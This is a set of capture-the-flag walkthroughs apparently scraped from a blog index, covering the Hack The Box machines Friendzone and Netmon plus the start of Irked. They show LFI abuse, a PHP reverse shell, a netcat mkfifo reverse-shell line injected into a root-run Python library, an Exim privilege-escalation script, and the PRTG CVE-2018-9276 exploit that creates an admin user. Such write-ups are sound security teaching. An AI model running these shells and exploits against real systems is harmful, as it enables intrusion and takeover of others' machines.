Not Found | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h02m42s, deviation: 1h43m54s, median: -2m43s |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2020-06-09T07:41:25+03:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-06-09T04:41:26 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds nmap shows there are quite few services running in the box. This could be good as there could be many options for getting in, but it may also mean there could be rabbit holes that make us waste time. Hopefully not! I go straight to some SMB enumeration. The nmap showed that the guest access is enabled so I can use the below smbmap command with a random password: m4rc0ff@SittingDucks:~$ smbmap -u guest -H 10 .10.10.123 [+] Guest session IP: 10.10.10.123:445 Name: friendzone.red Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers Files NO ACCESS FriendZone Samba Server Files /etc/Files general READ ONLY FriendZone Samba Server Files Development READ, WRITE FriendZone Samba Server Files IPC$ NO ACCESS IPC Service (FriendZone server (Samba, Ubuntu)) The above output is very useful as it tells us we have read access upon the general share and read/write access upon the development share. Let's see what's inside: m4rc0ff@SittingDucks:~$ smbclient -U guest //10.10.10.123/general Enter WORKGROUP\\guest's password: Try \"help\" to get a list of possible commands. smb: \\> dir . D 0 Wed Jan 16 20:10:51 2019 .. D 0 Wed Jan 23 21:51:02 2019 creds.txt N 57 Wed Oct 10 00:52:42 2018 9221460 blocks of size 1024. 6460280 blocks available smb: \\> get creds.txt getting file \\creds.txt of size 57 as creds.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec) I found the creds.txt file in the general share and once downloaded it to my box I can see it contains some credentials although I am not sure yet what they are for: m4rc0ff@SittingDucks:~/Documents/htbBoxes/friendzone$ cat creds.txt creds for the admin THING: admin:WORKWORKHhallelujah@# I did not find anything in the Develpment share: m4rc0ff@SittingDucks:~/Documents/htbBoxes/friendzone$ smbclient -U guest //10.10.10.123/development Enter WORKGROUP\\guest's password: Try \"help\" to get a list of possible commands. smb: \\> dir . D 0 Wed Jun 10 12:21:40 2020 .. D 0 Wed Jan 23 21:51:02 2019 9221460 blocks of size 1024. 6460280 blocks available smb: \\> One thing I notice is that the SSL cert shown in the nmap output has friendzone.red as the commonName, so I will add this to my /ets/hosts file indicating to resolve to the IP of the box ( 10.10.10.123 ). The webpage on http://10.10.10.123 shows this: This gives us clues of another potential domain which I also add to my /etc/hosts file. Looking at the two domains found so far we can see this: the html source for the above page shows some comments hinting to check the /js/js subdirectory: <!-- Just doing some development here --> <!-- /js/js --> <!-- Don't go deep ;) --> upon checking I see this if I refresh the page the string changes meaning there is some kind of code behind that generates it. The source code of this page shows another comment: <!-- dont stare too much , you will be smashed ! , it's all about times and zones ! --> Note sure about time to be honest but I wanted to try anyway a DNS zone transfer as it may lead to further information. Before doing so let's look ad the other webpage: The source code does not show anything interesting. So let's try the zone transfer: friendzone.red zone transfer m4rc0ff@SittingDucks:~$ host -l friendzone.red 10 .10.10.123 Using domain server: Name: 10.10.10.123 Address: 10.10.10.123#53 Aliases: friendzone.red has IPv6 address ::1 friendzone.red name server localhost. friendzone.red has address 127.0.0.1 administrator1.friendzone.red has address 127.0.0.1 hr.friendzone.red has address 127.0.0.1 uploads.friendzone.red has address 127.0.0.1 friendzoneportal.red zone transfer m4rc0ff@SittingDucks:~$ host -l friendzoneportal.red 10 .10.10.123 Using domain server: Name: 10.10.10.123 Address: 10.10.10.123#53 Aliases: friendzoneportal.red has IPv6 address ::1 friendzoneportal.red name server localhost. friendzoneportal.red has address 127.0.0.1 admin.friendzoneportal.red has address 127.0.0.1 files.friendzoneportal.red has address 127.0.0.1 imports.friendzoneportal.red has address 127.0.0.1 vpn.friendzoneportal.red has address 127.0.0.1 Wow these are a lot of entries! I add them all to my /etc/hosts file and start having a look. Visiting https://administrator1.friendzone.red yields this result: so I tried the credentials found earlier ( admin:WORKWORKHhallelujah@# ) which worked and I am presented with this page: so I go the the address suggested: Here I am told the image_name param is missing and I need to add it manually, so I do as instructed: Ok. Now the URL is a good candiate for an LFI (Local File Inclusion) vulnerability. I suspect timestamp is a PHP file (containing a timestamp function) that is being included, that is the file is present on a directory and we are able to call it from the URL. This suspect is enforced by the hint I saw earlier that stated \"it's all about times and zones\". I think it would be interesting at this stage to see if we find any other files that we could potentially include, so I give it a go with gobuster : m4rc0ff@SittingDucks:~$ gobuster dir -u https://administrator1.friendzone.red -w /usr/share/dirbuster/wo rdlists/directory-list-2.3-medium.txt -x php -t 30 -k =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: https://administrator1.friendzone.red [+] Threads: 30 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php [+] Timeout: 10s =============================================================== 2020/06/09 15:54:42 Starting gobuster =============================================================== /images (Status: 301) /login.php (Status: 200) /dashboard.php (Status: 200) /timestamp.php (Status: 200) /server-status (Status: 403) The above output shows that indeed we have a timestamp.php file. So I try to \"include\" login instead of timestampt in the URL and I get this: Including dashboard.php won't be useful as it will create a loop. Additionally, I won't be able to include some other local files such as /etc/passwd because only files with PHP extension work. We can see this because when we include timestamp.php we actually add timestamp in the URL without the .php extension. This is likely to be something similar to this: include($_GET[\"pagename\"] . \".php\") So the server expects the file name without the extension in the URL but in the backend the same file with the PHP extension will be called. This is why if we try to include /etc/passwd the server will look for a file named /etc/passwd.php which of course does not exist, no matter how many dots we add to get the right location, i.e. ../../../etc/passwd . If we want to see the actual PHP code of timestamp.php or login.php for instance, we can try a technique using the php://filter wrapper . Specifically the wrapper would allow us to include the login PHP file and base64-encode it as follow: php://filter/convert.base64-encode/resource=login So once I do it I get a long base64 string which I copy to my kali box and decode it: m4rc0ff@SittingDucks:~$ echo PD9waHAKCgokdXNlcm5hbWUgPSAkX1BPU1RbInVzZXJuYW1lIl07CiRwYXNzd29yZCA9ICRfUE9TVFsicGFzc3dvcmQiXTsKCi8vZWNobyAkdXNlcm5hbWUgPT09ICJhZG1pbiI7Ci8vZWNobyBzdHJjbXAoJHVzZXJuYW1lLCJhZG1pbiIpOwoKaWYgKCR1c2VybmFtZT09PSJhZG1pbiIgYW5kICRwYXNzd29yZD09PSJXT1JLV09SS0hoYWxsZWx1amFoQCMiKXsKCnNldGNvb2tpZSgiRnJpZW5kWm9uZUF1dGgiLCAiZTc3NDlkMGY0YjRkYTVkMDNlNmU5MTk2ZmQxZDE4ZjEiLCB0aW1lKCkgKyAoODY0MDAgKiAzMCkpOyAvLyA4NjQwMCA9IDEgZGF5CgplY2hvICJMb2dpbiBEb25lICEgdmlzaXQgL2Rhc2hib2FyZC5waHAiOwp9ZWxzZXsKZWNobyAiV3JvbmcgISI7Cn0KCgoKPz4K |base64 -d <?php $username = $_POST [ \"username\" ]; $password = $_POST [ \"password\" ]; //echo $username === \"admin\"; //echo strcmp($username,\"admin\"); if ( $username === \"admin\" and $password === \"WORKWORKHhallelujah@#\" ){ setcookie ( \"FriendZoneAuth\" , \"e7749d0f4b4da5d03e6e9196fd1d18f1\" , time () + ( 86400 * 30 )); // 86400 = 1 day echo \"Login Done ! visit /dashboard.php\" ; } else { echo \"Wrong !\" ; } ?> As shown above, the code expects the right credentials after which it will set the cookies and print \"Login Done ! visit /dashboard.php\". Else if the credentials are wrong it prints \"Wrong!\". With the same process we can also see the other files but I think the most important was this. Now, what we really need is a way to upload a php shell code into the same place where login.php and timestamp.php are located. This way we can execute it and get a reverse shell. There is one place where I am able to write, that is the Development share shown by the smbmap output. smbmap also showed something very useful: Files NO ACCESS FriendZone Samba Server Files /etc/Files The Files share (for which we don't have access) is located at /etc/Files . So there is a good chance the Development share is located at /etc/Development . So let's assume this is true for now. Also let us assume that webpages are hosted in the default apache directory, that is /var/www/html . If this is true we should be able to place a php file into /etc/Development and we should be able to include it jumping 3 directories up as follow: from /var/www/html to /etc/Development we can do this: ../../../etc/ Let's try that. <html> <head> <title>PHP Test</title> </head> <body> <?php echo '<p>Hey SittingDucks!</p>' ; ?> </body> </html> I create a file called test.php containing the above code and I place it to /etc/development m4rc0ff@SittingDucks:~/Documents/htbBoxes/friendzone$ smbclient -U guest //10.10.10.123/development Enter WORKGROUP\\guest's password: Try \"help\" to get a list of possible commands. smb: \\> put test.php putting file test.php as \\test.php (0.4 kb/s) (average 0.4 kb/s) smb: \\> dir . D 0 Wed Jun 10 18:08:26 2020 .. D 0 Wed Jan 23 21:51:02 2019 test.php A 119 Wed Jun 10 18:08:26 2020 9221460 blocks of size 1024. 6460100 blocks available Now if the above assumptions are tru we should be able to get the text \"hey SittingDucks!\" when including the test PHP file: It worked, so the assumtions were correct. We now have code execution and we can therefore upload a PHP reverse shell using the same procedure. For this I will use a php reverse shell available in kali, that is /usr/share/laudanum/php/php-reverse-shell.php . I copied the shell into a file named is shell.php . I modify the shell details adding my IP and port as follow: $ip = '10.10.14.29'; // CHANGE THIS $port = 443; // CHANGE THIS Then I push the shell to the Development share as I did for the test.php file and at the same time I start a netcat listener on my kali boc on port 443. Once I hit this address https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../etc/Development/shell in the browser I get my shell back as the www-data user: m4rc0ff@SittingDucks:~$ sudo nc -lnvp 443 [sudo] password for m4rc0ff: listening on [any] 443 ... connect to [10.10.14.29] from (UNKNOWN) [10.10.10.123] 56608 Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux 20:25:42 up 8:55, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ after upgrading to a full interactive shell using the procedure outlined here I was able to grab the user.txt flag: www-data@FriendZone:/home/friend$ cat user.txt a9****************************11 Privesc www-data --> friend I start exploring folders and /var/www contains a conf file containing database credentials: www-data@FriendZone:/var/www$ ls -l total 28 drwxr-xr-x 3 root root 4096 Jan 16 2019 admin drwxr-xr-x 4 root root 4096 Oct 6 2018 friendzone drwxr-xr-x 2 root root 4096 Oct 6 2018 friendzoneportal drwxr-xr-x 2 root root 4096 Jan 15 2019 friendzoneportaladmin drwxr-xr-x 3 root root 4096 Oct 6 2018 html -rw-r--r-- 1 root root 116 Oct 6 2018 mysql_data.conf drwxr-xr-x 3 root root 4096 Oct 6 2018 uploads www-data@FriendZone:/var/www$ cat mysql_data.conf for development process this is the mysql creds for user friend db_user=friend db_pass=Agpyu12!0.213$ db_name=FZ I try these credentials to login with the user friend and they worked: www-data@FriendZone:/var/www$ su - friend Password: friend@FriendZone:~$ whoami friend Privesc friend --> root I wanted to run LinEnum.sh without downloading it to the box using curl but I noticed curl is not installed in the box. So I download LinEnum.sh to the box in /tmp using wget . I see this regarding the user friend group membership: ### USER/GROUP ########################################## [ - ] Current user/group info: uid = 1000 ( friend ) gid = 1000 ( friend ) groups = 1000 ( friend ) ,4 ( adm ) ,24 ( cdrom ) ,30 ( dip ) ,46 ( plugdev ) ,111 ( lpadmin ) ,112 ( sambashare ) From a Ubuntu wiki I can read this about the sambashare group: Share files with the local network This right is gained by adding the user to the \"sambashare\" group. The \"sambashare\" group can access the /var/lib/samba/usershares directory. so I moved to that directory and also created a file there hoping it would somehow get root permissions but nothing interesting: friend@FriendZone:/var/lib/samba/usershares$ ls -l total 4 -rw-rw-r-- 1 friend friend 42 Jun 11 07:26 rev.sh I keep looking at LinEnum.sh output and noticed there is potrt 25 listening on localhost: tcp 0 0 127 .0.0.1:25 0 .0.0.0:* LISTEN - friend@FriendZone:/var/lib/samba/usershares$ telnet 127 .0.0.1 25 Trying 127.0.0.1... Connected to 127.0.0.1. Escape character is '&#94;]'. 220 FriendZone ESMTP Exim 4.90_1 Ubuntu Thu, 11 Jun 2020 07:38:48 +0300 user friend 500 unrecognized command I tried to connect using telnet but it does not recognize my commands. However, I still got the banner message which tells me we are dealing with Exim 4.90_1 . I then noticed that Exim is also among the SUID file: [ - ] SUID files: <SNIP> -rwsr-xr-x 1 root root 1140200 Feb 14 2018 /usr/sbin/exim4 <SNIP> Using searchsploit I noticed there is a privesc exploit script for Exim: Exim 4.87 - 4.91 - Local Privilege Escalation | linux/local/46996.sh So I downloaded the script to the victim box using wget and then I ran it: friend@FriendZone:/tmp$ ./46996.sh raptor_exim_wiz - \"The Return of the WIZard\" LPE exploit Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info> Preparing setuid shell helper... Problems compiling setuid shell helper, check your gcc. Falling back to the /bin/sh method. Delivering setuid payload... 220 FriendZone ESMTP Exim 4.90_1 Ubuntu Thu, 11 Jun 2020 08:01:27 +0300 250 FriendZone Hello ip6-localhost [::1] 250 OK 250 Accepted 354 Enter message, ending with \".\" on a line by itself 250 OK id=1jjFLD-0005UB-4C 221 FriendZone closing connection Waiting 5 seconds... -rwxr-xr-x 1 friend friend 121432 Jun 11 08:01 /tmp/pwned $ whoami friend $ /tmp/pwned $ whoami friend The script creates a file /tmp/pwned which afer inspecting the bash code, looks like this is a a copy of the sh shell binary. The pwned file should be generated with root permissions (I believe) but this does not succeed apparently hence not getting a privileged shell. After a while being stuck with exim trying different things I decided to use pspy to monitor the box processes to see if there are any interesting processes popping up such as ron jobs. After few minutes of monitorig something indeed popped up: 2020 /06/11 08 :50:01 CMD: UID = 0 PID = 21680 | /usr/bin/python /opt/server_admin/reporter.py 2020 /06/11 08 :50:01 CMD: UID = 0 PID = 21679 | /bin/sh -c /opt/server_admin/reporter.py 2020 /06/11 08 :50:01 CMD: UID = 0 PID = 21678 | /usr/sbin/CRON -f 2020 /06/11 08 :52:01 CMD: UID = 0 PID = 21684 | /usr/bin/python /opt/server_admin/reporter.py 2020 /06/11 08 :52:01 CMD: UID = 0 PID = 21683 | /bin/sh -c /opt/server_admin/reporter.py 2020 /06/11 08 :52:01 CMD: UID = 0 PID = 21682 | /usr/sbin/CRON -f 2020 /06/11 08 :54:01 CMD: UID = 0 PID = 21688 | /bin/sh -c /opt/server_admin/reporter.py 2020 /06/11 08 :54:01 CMD: UID = 0 PID = 21687 | /bin/sh -c /opt/server_admin/reporter.py 2020 /06/11 08 :54:01 CMD: UID = 0 PID = 21686 | /usr/sbin/CRON -f Although LinEnum.sh output did not show up any unusual cron job, pspy revealed there is a regular job running every 2 minutes. friend@FriendZone:/opt/server_admin$ ll total 12 drwxr-xr-x 2 root root 4096 Jan 24 2019 ./ drwxr-xr-x 3 root root 4096 Oct 6 2018 ../ -rwxr--r-- 1 root root 424 Jan 16 2019 reporter.py* reporter.py runs as root as shown above and contains the following code: friend @FriendZone : / opt / server_admin $ cat reporter . py #!/usr/bin/python import os to_address = \"admin1@friendzone.com\" from_address = \"admin2@friendzone.com\" print \"[+] Trying to send email to %s \" % to_address #command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass \"PAPAP\"''' #os.system(command) # I need to edit the script later # Sam ~ python developer The script does not do anything special. However, it imports an external library, that is os . A peek at the library shows this: friend@FriendZone:/opt/server_admin$ ll /usr/lib/python2.7/os.py -rwxrwxrwx 1 root root 25910 Jan 15 2019 /usr/lib/python2.7/os.py* The file has loose permissions (777) therefore we would be able to write on it. Surely this is a misconfiguration because if I look at the same file in my kali box I see permisions are set to 644: m4rc0ff@SittingDucks:~$ ll /usr/lib/python2.7/os.py -rw-r--r-- 1 root root 25910 Apr 20 21:30 /usr/lib/python2.7/os.py So now I can add a shell code in the os.py (I picked one from pentestmonkey ) and start a netcat listener on my kali box. When the cron job runs again I should get a shell: friend@FriendZone:/tmp$ echo 'system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 1234 >/tmp/f\")' >> /usr/lib/python2.7/os.py Finally I get the shell and I am able to read the root flag: m4rc0ff@SittingDucks:~$ sudo nc -lnvp 1234 [sudo] password for m4rc0ff: listening on [any] 1234 ... connect to [10.10.14.29] from (UNKNOWN) [10.10.10.123] 46358 /bin/sh: 0: can't access tty; job control turned off # whoami root # cat /root/root.txt b0****************************c7","tags":"blogging","loc":"https://sittingducks.io/Friendzone.html","title":"Friendzone"},{"url":"https://sittingducks.io/Netmon.html","text":"Recon masscan m4rc0ff@SittingDucks:~$ sudo masscan -p1-65535 10 .10.10.152 -e tun0 --rate = 1000 [sudo] password for m4rc0ff: Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-05 13:25:23 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [65535 ports/host] Discovered open port 135/tcp on 10.10.10.152 Discovered open port 49667/tcp on 10.10.10.152 Discovered open port 49664/tcp on 10.10.10.152 Discovered open port 80/tcp on 10.10.10.152 Discovered open port 49666/tcp on 10.10.10.152 Discovered open port 139/tcp on 10.10.10.152 Discovered open port 49668/tcp on 10.10.10.152 Discovered open port 49669/tcp on 10.10.10.152 Discovered open port 49665/tcp on 10.10.10.152 Discovered open port 47001/tcp on 10.10.10.152 Discovered open port 21/tcp on 10.10.10.152 Discovered open port 5985/tcp on 10.10.10.152 Discovered open port 445/tcp on 10.10.10.152 nmap (detailed scan on ports found by masscan) m4rc0ff@SittingDucks:~$ nmap -sC -sV -p135,49667,49664,80,49666,139,49668,49669,49665,47001,21,5985,445 10 .10.10.152 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 14:32 BST Nmap scan report for 10.10.10.152 Host is up (0.093s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM <DIR> inetpub | 07-16-16 09:18AM <DIR> PerfLogs | 02-25-19 10:56PM <DIR> Program Files | 02-03-19 12:28AM <DIR> Program Files (x86) | 02-03-19 08:08AM <DIR> Users |_02-25-19 11:49PM <DIR> Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-server-header: PRTG/18.1.37.13946 | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm |_http-trane-info: Problem with XML parsing of /evox/about 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -2m36s, deviation: 0s, median: -2m37s |_smb-os-discovery: ERROR: Script execution failed (use -d to debug) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-06-05T13:31:08 |_ start_date: 2020-06-05T13:22:00 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.01 seconds I can see there is an FTP server and that anonymous login is enabled so I start having a look. While browsing within the directories, I found the user.txt flag. Way too easy! m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$ ftp 10 .10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:m4rc0ff): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp> ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 11-20-16 10:46PM <DIR> $RECYCLE.BIN 02-03-19 12:18AM 1024 .rnd 11-20-16 09:59PM 389408 bootmgr 07-16-16 09:10AM 1 BOOTNXT 02-03-19 08:05AM <DIR> Documents and Settings 02-25-19 10:15PM <DIR> inetpub 06-05-20 09:21AM 738197504 pagefile.sys 07-16-16 09:18AM <DIR> PerfLogs 02-25-19 10:56PM <DIR> Program Files 02-03-19 12:28AM <DIR> Program Files (x86) 02-25-19 10:56PM <DIR> ProgramData 02-03-19 08:05AM <DIR> Recovery 02-03-19 08:04AM <DIR> System Volume Information 02-03-19 08:08AM <DIR> Users 02-25-19 11:49PM <DIR> Windows 226 Transfer complete. ftp> cd Users 250 CWD command successful. ftp> cd Public 250 CWD command successful. ftp> ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:08AM <DIR> AccountPictures 02-03-19 12:18AM <DIR> Desktop 07-16-16 09:16AM 174 desktop.ini 02-03-19 08:05AM <DIR> Documents 07-16-16 09:18AM <DIR> Downloads 07-16-16 09:18AM <DIR> Libraries 07-16-16 09:18AM <DIR> Music 07-16-16 09:18AM <DIR> Pictures 02-03-19 12:35AM 33 user.txt 07-16-16 09:18AM <DIR> Videos 226 Transfer complete. ftp> get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0.09 secs (0.3641 kB/s) once downloaded, we can read the file: m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$ cat user.txt dd****************************a5 Visiting the website on port 80 i can see this: this explained why the box is dubbed netmon . We can see we are dealing with PRTG Ntwork Monitor 18.1.37.13946 . I kept searching for an exploit but i only found this RCE with searchsploit : PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution | windows/webapps/46527.sh Although version wise is valid, the explit requires us to be authenticated. After some research I found this article on paessler website talking about exposed credentials on PRTG backup files stored on C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.old . I noticed there is the same directory in the FTP server containing 3 PRTG configuration files: -rw-r--r-- 1 m4rc0ff m4rc0ff 1159598 Jun 8 10:25 'PRTG Configuration.dat' -rw-r--r-- 1 m4rc0ff m4rc0ff 1159598 Jun 8 10:25 'PRTG Configuration.old' -rw-r--r-- 1 m4rc0ff m4rc0ff 1124497 Jun 8 10:25 'PRTG Configuration.old.bak' I also gathered online that the default admin user is prtgadmin . With that in mind I do a grep on the three files hoping to find valid credentials: m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$ grep -i -B10 -A10 prtgadmin PRTG \\ Configuration.* <SNIP> PRTG Configuration.old.bak- <dbpassword> PRTG Configuration.old.bak: <!-- User: prtgadmin --> PRTG Configuration.old.bak- PrTg@dmin2018 PRTG Configuration.old.bak- </dbpassword> <SNIP> As shown above we found the credentials prtgadmin/PrTg@admin2018 . I tried them out but I was unable to login: So what's the next password you would try if this one failed? Since the password was found on an old backup file with 2018 on it, I would think to try the same password but with 2019 . The password worked and we are in! Let's see now how we can use the exploit we found earlier, that is exploit 46527 . In summary the exploit leverages a capability of PRTG Netmon of running external programs as part of a \"notification\" feature. One of the default demo scripts, that is Demo EXE notification - OutFile.ps1 was found weak in that the \"parameter\" field of the \"notification\" configuration is passed directly into the PowerShell script without any sanitization, resulting in the ability to inject any PowerShell code. More details can be found https://www.codewatch.org/blog/?p=453 . Because PRTG Netmon services by default run as local system any command that we will try will run with administrative privileges. The exploit is a bash script that will leverage the above vulnerability to execute a command to create a user called pentest with password P3nT3st and add the user to the administrators group. Let's see it in action: m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$ ./46527.sh [ + ] #########################################################################[+] [ * ] Authenticated PRTG network Monitor remote code execution [ * ] [ + ] #########################################################################[+] [ * ] Date: 11 /03/2019 [ * ] [ + ] #########################################################################[+] [ * ] Author: https://github.com/M4LV0 lorn3m4lvo@protonmail.com [ * ] [ + ] #########################################################################[+] [ * ] Vendor Homepage: https://www.paessler.com/prtg [ * ] [ * ] Version: 18 .2.38 [ * ] [ * ] CVE: CVE-2018-9276 [ * ] [ * ] Reference: https://www.codewatch.org/blog/?p = 453 [ * ] [ + ] #########################################################################[+] # login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script. # run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' [ + ] #########################################################################[+] EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c \"_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1\" As per the script usage instructions, we first need to login to the PRTG netmon interface and then we need to grab the cookies. We can do that using the browser developer tools (F12) and going to the \"Network\" tab in the left panel and the \"Cookies\" tab in the right panel: Once we grab the cookies we can run the command as follows: m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$ ./46527.sh -u http://10.10.10.152 -c \"_ga=GA1.4.1580492822.1591611849; _gid=GA1.4.1769898011.1591611849; OCTOPUS1813713946=e0E5RDJGMDg5LTQ4NjMtNEQxQy04RDFGLUFBMjVFNDRGMjExNn0=; _gat=1\" [+]# ########################################################################[+] [*] Authenticated PRTG network Monitor remote code execution [*] [+]# ########################################################################[+] [*] Date: 11/03/2019 [*] [+]# ########################################################################[+] [*] Author: https://github.com/M4LV0 lorn3m4lvo@protonmail.com [*] [+]# ########################################################################[+] [*] Vendor Homepage: https://www.paessler.com/prtg [*] [*] Version: 18.2.38 [*] [*] CVE: CVE-2018-9276 [*] [*] Reference: https://www.codewatch.org/blog/?p=453 [*] [+]# ########################################################################[+] # login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script. # run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' [+]# ########################################################################[+] [*] file created [*] sending notification wait.... [*] adding a new user 'pentest' with password 'P3nT3st' [*] sending notification wait.... [*] adding a user pentest to the administrators group [*] sending notification wait.... [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! Then we can use psexec.py to get a shell and grab the root flag: m4rc0ff@SittingDucks:~/Documents/htbBoxes/netmon$ psexec.py pentest: 'P3nT3st!' @10.10.10.152 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.152..... [*] Found writable share ADMIN$ [*] Uploading file svBIWdCU.exe [*] Opening SVCManager on 10.10.10.152..... [*] Creating service jBYn on 10.10.10.152..... [*] Starting service jBYn..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami nt authority\\system C:\\Windows\\system32>type C:\\Users\\Administrator\\Desktop\\root.txt 30****************************cc","tags":"blogging","loc":"https://sittingducks.io/Netmon.html","title":"Netmon"},{"url":"https://sittingducks.io/Irked.html","text":"I enjoyed this box, maybe because it's easy and I managed to root it without too much struggle. As the name of the box suggests we are dealing with the IRC (Internet Relay Chat) protocol. IRC is an old messaging protocol still very active nowadays. UnrealIRC is a server implementation of IRC which has been compromised in the past and got backdoored. We are going to leverage that to get initial foothold, I also wrote a little python script to achieve that. Privesc is quite easy too, the only difficult part was to indentify a weak SUID file but after that it was easy to get root access. Recon I start with a full tcp scan using masscan : m4rc0ff@SittingDucks:~$ sudo masscan -p1-65535 10 .10.10.117 -e tun0 --rate = 1000 [sudo] password for m4rc0ff: Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-04 13:26:17 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [65535 ports/host] Discovered open port 65534/tcp on 10.10.10.117 Discovered open port 80/tcp on 10.10.10.117 Discovered open port 22/tcp on 10.10.10.117 Discovered open port 111/tcp on 10.10.10.117 Discovered open port 8067/tcp on 10.10.10.117 Discovered open port 58697/tcp on 10.10.10.117 Discovered open port 6697/tcp on 10.10.10.117 The second step is to enumerate the services behind the ports found by masscan , we can use nmap for that: m4rc0ff@SittingDucks:~$ nmap -sC -sV -p65534,80,22,111,8067,58697,6697 10 .10.10.117 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 14:28 BST Nmap scan report for 10.10.10.117 Host is up (0.090s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 